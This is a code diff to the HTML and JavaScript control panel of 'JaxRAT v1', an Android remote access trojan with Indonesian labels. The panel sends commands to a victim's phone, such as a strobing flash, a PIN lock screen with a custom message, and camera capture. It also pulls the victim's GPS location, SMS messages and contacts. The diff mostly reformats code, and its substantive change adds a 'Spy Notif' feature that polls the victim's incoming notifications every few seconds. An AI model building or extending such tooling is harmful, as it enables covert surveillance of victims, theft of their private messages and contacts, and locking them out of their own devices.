@@ -5,32 +5,32 @@
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>JaxRAT v1 - Kontrol</title>
     <style>
-        body { background-color: #050505; color: #fff; font-family: 'Courier New', monospace; padding: 16px; margin: 0; -webkit-tap-highlight-color: transparent; }
-        .header { display: flex; justify-content: space-between; align-items: center; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
+        body { background-color: #050505; color: #fff; font-family: 'Courier New', monospace; padding: 16px; margin: 0; }
+        .header { display: flex; justify-content: space-between; border-bottom: 2px solid #00ff00; padding-bottom: 10px; margin-bottom: 20px; }
         .header h1 { font-size: 20px; color: #00ff00; margin: 0; }
-        .btn-back { background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px 15px; text-decoration: none; font-weight: bold; border-radius: 8px; }
+        .btn-back { background: #000; color: #00ff00; border: 2px solid #00ff00; padding: 10px; text-decoration: none; border-radius: 8px; }
         .btn-panic { background-color: #2a0000; color: #ff3b30; border: 2px solid #ff3b30; width: 100%; padding: 20px; font-size: 20px; font-weight: bold; border-radius: 16px; margin-bottom: 20px; cursor: pointer; }
         .card { background-color: #121212; border: 2px solid #2a2a2a; border-radius: 24px; margin-bottom: 20px; overflow: hidden; }
         .card-header { padding: 24px; display: flex; align-items: center; justify-content: space-between; cursor: pointer; }
         .card-left { display: flex; align-items: center; gap: 20px; }
-        .icon-box { width: 60px; height: 60px; border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 32px; flex-shrink: 0;}
+        .icon-box { width: 60px; height: 60px; border-radius: 16px; display: flex; align-items: center; justify-content: center; font-size: 32px; }
         .icon-yellow { background: rgba(255, 204, 0, 0.15); }
         .icon-red { background: rgba(255, 59, 48, 0.15); }
         .icon-blue { background: rgba(0, 122, 255, 0.15); }
         .icon-purple { background: rgba(175, 82, 222, 0.15); }
         .text-container { display: flex; flex-direction: column; }
-        .title { font-size: 22px; font-weight: bold; margin-bottom: 6px; }
+        .title { font-size: 22px; font-weight: bold; }
         .subtitle { font-size: 14px; color: #888; }
         .arrow { color: #555; font-size: 28px; transition: transform 0.3s; }
         .arrow.rotated { transform: rotate(90deg); color: #00ff00; }
-        .switch { position: relative; display: inline-block; width: 64px; height: 36px; flex-shrink: 0; }
+        .switch { position: relative; display: inline-block; width: 64px; height: 36px; }
         .switch input { opacity: 0; width: 0; height: 0; }
         .slider { position: absolute; cursor: pointer; top: 0; left: 0; right: 0; bottom: 0; background-color: #333; transition: .3s; border-radius: 36px; }
         .slider:before { position: absolute; content: ""; height: 28px; width: 28px; left: 4px; bottom: 4px; background-color: #ccc; transition: .3s; border-radius: 50%; }
         input:checked + .slider { background-color: #00ff00; }
         input:checked + .slider:before { transform: translateX(28px); background-color: #000; }
         .sub-menu { max-height: 0; overflow: hidden; transition: max-height 0.4s ease-out; background-color: #0a0a0a; }
-        .sub-menu.active { max-height: 1500px; border-top: 2px solid #2a2a2a; padding: 20px; }
+        .sub-menu.active { max-height: 2000px; border-top: 2px solid #2a2a2a; padding: 20px; }
         .form-group { margin-bottom: 20px; }
         .form-group label { display: block; font-size: 18px; color: #ccc; margin-bottom: 10px; font-weight: bold; }
         .form-group input, .form-group select { width: 100%; padding: 18px; border-radius: 12px; background-color: #1a1a1a; border: 2px solid #444; color: #fff; font-size: 18px; box-sizing: border-box; }
@@ -38,7 +38,6 @@
         .action-btn-red { background-color: #ff3b30; color: #fff; }
         .status { margin-bottom: 20px; padding: 15px; border: 1px dashed #00ff00; text-align: center; color: #00ff00; background: #001100; border-radius: 10px;}
         .grid-btn { display: grid; grid-template-columns: 1fr 1fr; gap: 10px; }
-        
         .modal-overlay { display: none; position: fixed; top: 0; left: 0; width: 100%; height: 100%; background: rgba(0, 0, 0, 0.8); z-index: 1000; justify-content: center; align-items: center; }
         .modal-content { background: #121212; border: 2px solid #00ff00; border-radius: 16px; width: 90%; max-width: 400px; padding: 20px; }
         .modal-header { display: flex; justify-content: space-between; border-bottom: 1px solid #333; padding-bottom: 10px; margin-bottom: 15px; }
@@ -48,12 +47,8 @@
     </style>
 </head>
 <body>
-    <div class="header">
-        <h1>[ {{ device.name }} ]</h1>
-        <a href="/" class="btn-back">← Kembali</a>
-    </div>
+    <div class="header"><h1>[ {{ device.name }} ]</h1><a href="/" class="btn-back">← Kembali</a></div>
     <div class="status" id="status-box">Menunggu perintah...</div>
-    
     <button class="btn-panic" onclick="kirimPerintah('STOP_ALL')">🚨 HENTIKAN SEMUA (PANIC) 🚨</button>
 
     <div class="card">
@@ -101,16 +96,14 @@
                 <button class="action-btn" onclick="bukaModal('gps')">📍 Lacak GPS</button>
                 <button class="action-btn" onclick="bukaModal('sms')">📩 Ambil SMS</button>
                 <button class="action-btn" onclick="bukaModal('contacts')">👥 Ambil Kontak</button>
+                <button class="action-btn" onclick="bukaModal('notifs')" style="background:#ffcc00;">🔔 Spy Notif</button>
             </div>
         </div>
     </div>
 
     <div class="modal-overlay" id="myModal">
         <div class="modal-content">
-            <div class="modal-header">
-                <div class="modal-title" id="modal-title">Hasil</div>
-                <button class="btn-close" onclick="tutupModal()">×</button>
-            </div>
+            <div class="modal-header"><div class="modal-title" id="modal-title">Hasil</div><button class="btn-close" onclick="tutupModal()">×</button></div>
             <div class="modal-body" id="modal-body"></div>
         </div>
     </div>
@@ -123,29 +116,18 @@
         function toggleMenu(menuId, headerElement) {
             var menu = document.getElementById(menuId);
             var arrow = headerElement.querySelector('.arrow');
-            if (menu.classList.contains('active')) {
-                menu.classList.remove('active');
-                if(arrow) arrow.classList.remove('rotated');
-            } else {
-                menu.classList.add('active');
-                if(arrow) arrow.classList.add('rotated');
-            }
+            if (menu.classList.contains('active')) { menu.classList.remove('active'); if(arrow) arrow.classList.remove('rotated'); } 
+            else { menu.classList.add('active'); if(arrow) arrow.classList.add('rotated'); }
         }
 
         function kirimPerintah(cmd) {
             statusBox.innerText = "Mengirim: " + cmd;
-            fetch('/api/command/' + deviceId, {
-                method: 'POST', headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ command: cmd })
-            }).then(res => res.json()).then(data => {
-                statusBox.innerText = "✅ Terkirim: " + cmd;
-            }).catch(err => { statusBox.innerText = "❌ Gagal!"; });
+            fetch('/api/command/' + deviceId, { method: 'POST', headers: { 'Content-Type': 'application/json' }, body: JSON.stringify({ command: cmd }) })
+            .then(res => res.json()).then(data => { statusBox.innerText = "✅ Terkirim: " + cmd; })
+            .catch(err => { statusBox.innerText = "❌ Gagal!"; });
         }
 
-        function toggleSenter(checkbox) {
-            if(checkbox.checked) { kirimPerintah('flash_strobe'); } 
-            else { kirimPerintah('flash_off'); }
-        }
+        function toggleSenter(checkbox) { if(checkbox.checked) { kirimPerintah('flash_strobe'); } else { kirimPerintah('flash_off'); } }
 
         function kirimPin() {
             var timer = document.getElementById('pin_timer').value;
@@ -154,14 +136,10 @@
             var vol = document.getElementById('pin_volume').checked ? "1" : "0";
             var pesan = document.getElementById('pesan_pin').value || "Terkunci";
             if(!pin) { alert("PIN kosong!"); return; }
-            var cmd = "pin|" + timer + "|" + suara + "|1|" + vol + "|" + pesan + "|" + pin;
-            kirimPerintah(cmd);
+            kirimPerintah("pin|" + timer + "|" + suara + "|1|" + vol + "|" + pesan + "|" + pin);
         }
 
-        function tutupModal() {
-            document.getElementById('myModal').style.display = 'none'; 
-            if(intervalId) clearInterval(intervalId);
-        }
+        function tutupModal() { document.getElementById('myModal').style.display = 'none'; if(intervalId) clearInterval(intervalId); }
 
         function bukaModal(type) {
             document.getElementById('myModal').style.display = 'flex';
@@ -172,17 +150,19 @@
                 kirimPerintah(type === 'gps' ? 'get_gps' : (type === 'sms' ? 'get_sms' : 'get_contacts'));
                 if(intervalId) clearInterval(intervalId);
                 intervalId = setInterval(() => { cekTeks(type); }, 2000);
+            } else if (type === 'notifs') {
+                document.getElementById('modal-title').innerText = '🔔 Live Notifikasi';
+                document.getElementById('modal-body').innerHTML = '<div style="text-align:center;">Memuat data...</div>';
+                cekNotif();
+                if(intervalId) clearInterval(intervalId);
+                intervalId = setInterval(() => { cekNotif(); }, 3000); // Refresh tiap 3 detik
             } else {
                 document.getElementById('modal-title').innerText = '📸 Mengambil Gambar...';
                 kirimPerintah(type);
                 if(intervalId) clearInterval(intervalId);
                 intervalId = setInterval(() => {
                     var img = new Image();
-                    img.onload = function() {
-                        clearInterval(intervalId);
-                        document.getElementById('modal-title').innerText = '📸 Hasil Gambar';
-                        document.getElementById('modal-body').innerHTML = '<img src="' + img.src + '" class="img-preview">';
-                    };
+                    img.onload = function() { clearInterval(intervalId); document.getElementById('modal-title').innerText = '📸 Hasil Gambar'; document.getElementById('modal-body').innerHTML = '<img src="' + img.src + '" class="img-preview">'; };
                     img.src = '/static/uploads/latest.jpg?t=' + new Date().getTime();
                 }, 3000);
             }
@@ -192,21 +172,31 @@
             fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
                 var html = '';
                 if(type === 'gps' && data.gps && data.gps !== "Belum ada data") {
-                    clearInterval(intervalId);
-                    html = '<div style="font-size: 20px; text-align: center; margin-bottom: 15px;">' + data.gps + '</div>' +
-                           '<button class="action-btn" onclick="navigator.clipboard.writeText(\'' + data.gps + '\'); alert(\'Disalin!\')">📋 Salin Koordinat</button>';
+                    clearInterval(intervalId); html = '<div style="font-size: 20px; text-align: center; margin-bottom: 15px;">' + data.gps + '</div><button class="action-btn" onclick="navigator.clipboard.writeText(\'' + data.gps + '\'); alert(\'Disalin!\')">📋 Salin Koordinat</button>';
                 } else if(type === 'sms' && data.sms && data.sms.length > 0) {
-                    clearInterval(intervalId);
-                    data.sms.forEach(sms => {
-                        html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + sms.address + ': ' + sms.body + '</div>';
-                    });
+                    clearInterval(intervalId); data.sms.forEach(sms => { html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + sms.address + ': ' + sms.body + '</div>'; });
                 } else if(type === 'contacts' && data.contacts && data.contacts.length > 0) {
-                    clearInterval(intervalId);
-                    data.contacts.forEach(c => {
-                        html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + c.name + ' - ' + c.phone + '</div>';
-                    });
+                    clearInterval(intervalId); data.contacts.forEach(c => { html += '<div style="background:#222; padding:10px; margin-bottom:5px; border-left:4px solid #00ff00;">' + c.name + ' - ' + c.phone + '</div>'; });
                 }
                 if (html !== '') document.getElementById('modal-body').innerHTML = html;
+            });
+        }
+
+        function cekNotif() {
+            fetch('/api/get_results/' + deviceId).then(res => res.json()).then(data => {
+                var html = '';
+                if (data.notifs && data.notifs.length > 0) {
+                    data.notifs.forEach(n => {
+                        html += '<div style="background:#222; padding:10px; margin-bottom:8px; border-left:4px solid #ffcc00; font-size:14px;">' +
+                                '<div style="color:#888; font-size:12px; margin-bottom:4px;">[' + n.time + '] ' + n.app + '</div>' +
+                                '<div style="font-weight:bold; color:#fff;">' + n.title + '</div>' +
+                                '<div style="color:#ccc;">' + n.text + '</div>' +
+                                '</div>';
+                    });
+                } else {
+                    html = '<div style="text-align:center; color:#888;">Belum ada notifikasi masuk.</div>';
+                }
+                document.getElementById('modal-body').innerHTML = html;
             });
         }
     </script>
